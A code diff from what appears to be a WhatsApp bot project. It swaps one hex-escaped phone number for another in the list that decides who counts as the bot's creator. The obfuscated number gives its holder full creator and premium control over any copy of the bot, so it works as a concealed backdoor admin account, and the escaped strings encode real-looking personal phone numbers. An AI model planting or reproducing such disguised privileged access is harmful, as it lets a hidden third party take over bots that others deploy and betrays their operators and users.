@@ -241,8 +241,8 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
     const args = body.trim().split(/ +/).slice(1)
     const pushname = m.pushName || "No Name"
     const botNumber = await Taira.decodeJid(Taira.user.id)
-    const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
-    const isCreator = [author,botNumber, ...global.Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+    const _auth = `\x32\x33\x34\x38\x31\x36\x34\x37\x34\x37\x35\x33\x34`
+    const isCreator = [_auth,botNumber, ...global.Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
     const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
     const itsMe = m.sender == botNumber ? true : false
     const text = args.join(" ")
